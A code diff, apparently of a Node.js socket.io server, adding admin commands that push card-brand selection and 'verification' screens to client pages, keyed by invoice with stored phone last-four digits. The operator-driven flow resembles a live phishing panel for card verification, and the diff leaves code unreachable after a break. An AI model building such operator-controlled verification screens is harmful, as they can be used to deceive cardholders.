@@ -1670,7 +1670,58 @@ socket.on('admin_command', (data) => {
         }
       }
     }
-    
+
+    // Execute the command
+  switch (command) {
+    case 'show_brand_selection':
+      // This is a new command for showing brand selection in client
+      console.log('Showing brand selection for:', invoiceId);
+      
+      // Store this transaction as pending brand selection
+      if (!verificationStates.has(invoiceId)) {
+        verificationStates.set(invoiceId, {
+          status: 'brand_selection_pending',
+          phoneLastFour: phoneLastFour || '',
+          brandType: brandType || 'mastercard'
+        });
+      }
+      
+      // Send to client
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('show_brand_selection', {
+          invoiceId
+        });
+      });
+      
+      // Also broadcast to the room
+      io.to(invoiceId).emit('show_brand_selection', {
+        invoiceId
+      });
+      break;
+      
+    case 'update_brand_type':
+      // Update the brand type for this verification
+      if (verificationStates.has(invoiceId)) {
+        const state = verificationStates.get(invoiceId);
+        state.brandType = brandType || 'mastercard';
+        verificationStates.set(invoiceId, state);
+        
+        // Update client
+        clientSockets.forEach(clientSocket => {
+          clientSocket.emit('update_brand_type', {
+            invoiceId,
+            brandType: brandType || 'mastercard'
+          });
+        });
+        
+        // Also broadcast to the room
+        io.to(invoiceId).emit('update_brand_type', {
+          invoiceId,
+          brandType: brandType || 'mastercard'
+        });
+      }
+      break;
+      
     // Try the transaction's stored socketId as a last resort
     const txn = transactions.get(invoiceId);
     if (txn && txn.socketId && clientSockets.length === 0) {
